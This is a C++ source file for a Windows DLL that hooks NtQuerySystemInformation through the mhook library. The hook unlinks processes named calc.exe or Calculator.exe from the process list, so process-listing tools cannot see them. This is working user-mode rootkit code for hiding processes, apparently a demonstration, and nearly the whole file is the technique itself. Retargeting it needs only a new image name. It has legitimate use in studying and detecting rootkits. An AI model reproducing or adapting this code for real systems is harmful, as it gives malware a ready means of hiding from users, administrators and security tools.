#include "stdafx.h"
#include <mhook-lib/mhook.h>

//////////////////////////////////////////////////////////////////////////
// Defines and typedefs

// Missing values _SYSTEM_INFORMATION_CLASS enum from <winternl.h>
const int g_SystemExtendedProcessInformationID = 0x39;
const int g_SystemFullProcessInformationID = 0x94;

using NtQuerySystemInformationFn = NTSTATUS(WINAPI *)(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID SystemInformation,
    __in       ULONG SystemInformationLength,
    __out_opt  PULONG ReturnLength
    );

//////////////////////////////////////////////////////////////////////////
// Original function

auto OriginalNtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(
    ::GetProcAddress(::GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation"));

//////////////////////////////////////////////////////////////////////////
// Hooked function

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
    )
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (!NT_SUCCESS(status))
    {
        return status;
    }

    switch (SystemInformationClass)
    {
        case SystemProcessInformation:
        case g_SystemExtendedProcessInformationID:
        case g_SystemFullProcessInformationID:
        {
            // Loop through the list of processes
            PSYSTEM_PROCESS_INFORMATION pCurrent = nullptr;
            PSYSTEM_PROCESS_INFORMATION pNext = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);

            do
            {
                pCurrent = pNext;
                pNext = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<PUCHAR>(pCurrent) + pCurrent->NextEntryOffset);

                if (0 == wcsncmp(pNext->ImageName.Buffer, L"calc.exe", pNext->ImageName.Length)
                    || 0 == wcsncmp(pNext->ImageName.Buffer, L"Calculator.exe", pNext->ImageName.Length))
                {
                    if (0 == pNext->NextEntryOffset)
                    {
                        pCurrent->NextEntryOffset = 0;
                    }
                    else
                    {
                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                    }

                    pNext = pCurrent;
                }
            } while (pCurrent->NextEntryOffset != 0);
            break;
        }
        default:
        {
            break;
        }
    }

    return status;
}

//////////////////////////////////////////////////////////////////////////
// Entry point

BOOL WINAPI DllMain(
    __in HINSTANCE  hInstance,
    __in DWORD      Reason,
    __in LPVOID     Reserved
    )
{
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
        Mhook_SetHook(reinterpret_cast<PVOID*>(&OriginalNtQuerySystemInformation), HookedNtQuerySystemInformation);
        break;

    case DLL_PROCESS_DETACH:
        Mhook_Unhook(reinterpret_cast<PVOID*>(&OriginalNtQuerySystemInformation));
        break;
    }

    return TRUE;
}
